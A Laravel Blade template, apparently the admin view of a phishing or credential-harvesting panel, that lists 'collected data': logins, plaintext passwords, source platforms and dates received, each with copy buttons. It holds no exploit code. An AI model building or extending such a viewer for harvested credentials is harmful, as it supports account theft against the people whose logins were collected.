<div class="card">
    <div class="card-header">
        <h5>Données collectionnées</h5>
    </div>
    <div style="padding-top: 0" class="card-body">
        <div class="dt-ext table-responsive">
            <div id="responsive_wrapper" class="dataTables_wrapper container-fluid dt-bootstrap4">
                <div class="row">
                    <div class="col-sm-12">
                        <table class="display dataTable dtr-inline" id="responsive" role="grid" aria-describedby="responsive_info" style="width: 1157px;">
                            <thead>
                            <tr role="row">
                                <th class="sorting_asc" tabindex="0" aria-controls="responsive" rowspan="1" colspan="1" style="width: 183px;" aria-sort="ascending" aria-label="Name: activate to sort column descending">Login</th>
                                <th class="sorting" tabindex="0" aria-controls="responsive" rowspan="1" colspan="1" style="width: 286px;" aria-label="Position: activate to sort column ascending">Mot de passe</th>
                                <th class="sorting" tabindex="0" aria-controls="responsive" rowspan="1" colspan="1" style="width: 139px;" aria-label="Office: activate to sort column ascending">Plate-forme</th>
                                <th class="sorting" tabindex="0" aria-controls="responsive" rowspan="1" colspan="1" style="width: 63px;" aria-label="Age: activate to sort column ascending">Date de reception</th>
                            </tr>
                            </thead>
                            <tbody x-data>
                                @php $odd = true @endphp
                                @foreach($notebooks as $data)
                                <tr role="row" @class(['odd' => $odd, 'even' => !$odd])>
                                    <td x-on:click="copyToClipboard($el)" tabindex="0" class="sorting_1">
                                        <div class="content_value">
                                            <span class="value">{{ $data->login }}</span>
                                            <span class="icon">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard2-check" viewBox="0 0 16 16">
                                                        <path d="M9.5 0a.5.5 0 0 1 .5.5.5.5 0 0 0 .5.5.5.5 0 0 1 .5.5V2a.5.5 0 0 1-.5.5h-5A.5.5 0 0 1 5 2v-.5a.5.5 0 0 1 .5-.5.5.5 0 0 0 .5-.5.5.5 0 0 1 .5-.5h3Z"/>
                                                        <path d="M3 2.5a.5.5 0 0 1 .5-.5H4a.5.5 0 0 0 0-1h-.5A1.5 1.5 0 0 0 2 2.5v12A1.5 1.5 0 0 0 3.5 16h9a1.5 1.5 0 0 0 1.5-1.5v-12A1.5 1.5 0 0 0 12.5 1H12a.5.5 0 0 0 0 1h.5a.5.5 0 0 1 .5.5v12a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-12Z"/>
                                                        <path d="M10.854 7.854a.5.5 0 0 0-.708-.708L7.5 9.793 6.354 8.646a.5.5 0 1 0-.708.708l1.5 1.5a.5.5 0 0 0 .708 0l3-3Z"/>
                                                    </svg>
                                                </span>
                                            <div class="tooltip">
                                                <span class="text_tooltip">Ok texte a ete copie</span>
                                            </div>
                                        </div>
                                    </td>
                                    <td x-on:click="copyToClipboard($el)">
                                        <div class="content_value">
                                            <span class="value">{{ $data->password }}</span>
                                            <span class="icon">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard2-check" viewBox="0 0 16 16">
                                                        <path d="M9.5 0a.5.5 0 0 1 .5.5.5.5 0 0 0 .5.5.5.5 0 0 1 .5.5V2a.5.5 0 0 1-.5.5h-5A.5.5 0 0 1 5 2v-.5a.5.5 0 0 1 .5-.5.5.5 0 0 0 .5-.5.5.5 0 0 1 .5-.5h3Z"/>
                                                        <path d="M3 2.5a.5.5 0 0 1 .5-.5H4a.5.5 0 0 0 0-1h-.5A1.5 1.5 0 0 0 2 2.5v12A1.5 1.5 0 0 0 3.5 16h9a1.5 1.5 0 0 0 1.5-1.5v-12A1.5 1.5 0 0 0 12.5 1H12a.5.5 0 0 0 0 1h.5a.5.5 0 0 1 .5.5v12a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-12Z"/>
                                                        <path d="M10.854 7.854a.5.5 0 0 0-.708-.708L7.5 9.793 6.354 8.646a.5.5 0 1 0-.708.708l1.5 1.5a.5.5 0 0 0 .708 0l3-3Z"/>
                                                    </svg>
                                                </span>
                                            <div class="tooltip">
                                                <span class="text_tooltip">Ok texte a ete copie</span>
                                            </div>
                                        </div>
                                    </td>
                                    <td>{{ ucfirst($data->website->name) }}</td>
                                    <td>{{ $data->created_at }}</td>
                                </tr>
                                @php $odd = !$odd @endphp
                                @endforeach
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
